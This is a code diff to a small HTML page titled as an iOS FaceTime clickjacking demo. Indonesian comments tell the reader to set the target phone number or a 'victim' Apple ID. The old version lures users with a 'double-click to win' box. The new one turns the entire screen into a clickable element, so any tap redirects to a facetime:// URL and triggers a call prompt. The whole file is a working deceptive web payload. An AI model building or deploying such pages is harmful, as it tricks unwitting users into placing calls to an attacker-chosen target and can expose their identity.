@@ -1,57 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>iOS FaceTime Clickjacking Demo</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      overflow: hidden;
-      user-select: none;
-      font-family: sans-serif;
-    }
+<body style="margin:0;height:100vh;overflow:hidden">
 
-    #redBox {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      width: 40px;
-      height: 40px;
-      background-color: red;
-      cursor: pointer;
-    }
-
-    #counter {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 32px;
-    }
-  </style>
-</head>
-<body>
-
-<div id="redBox"></div>
-<div id="counter">Double‑click the red box to win!</div>
+<div id="btn" style="
+  position:absolute;
+  inset:0;
+  background:red;
+"></div>
 
 <script>
-let clickCount = 0;
-
-document.getElementById("redBox").onclick = () => {
-  clickCount++;
-  document.getElementById("counter").innerText = "x" + clickCount;
-
-  // DOUBLE CLICK → FaceTime call
-  if (clickCount === 2) {
-    // GANTI target sesuai kebutuhan:
-    // nomor telepon:
-    window.location = "facetime://+6281234567890";
-
-    // atau email Apple ID:
-    // window.location = "facetime://victim@example.com";
-  }
+document.getElementById("btn").onclick = () => {
+  // langsung munculkan call prompt
+  window.location = "facetime://+6281234567890";
 };
 </script>
 
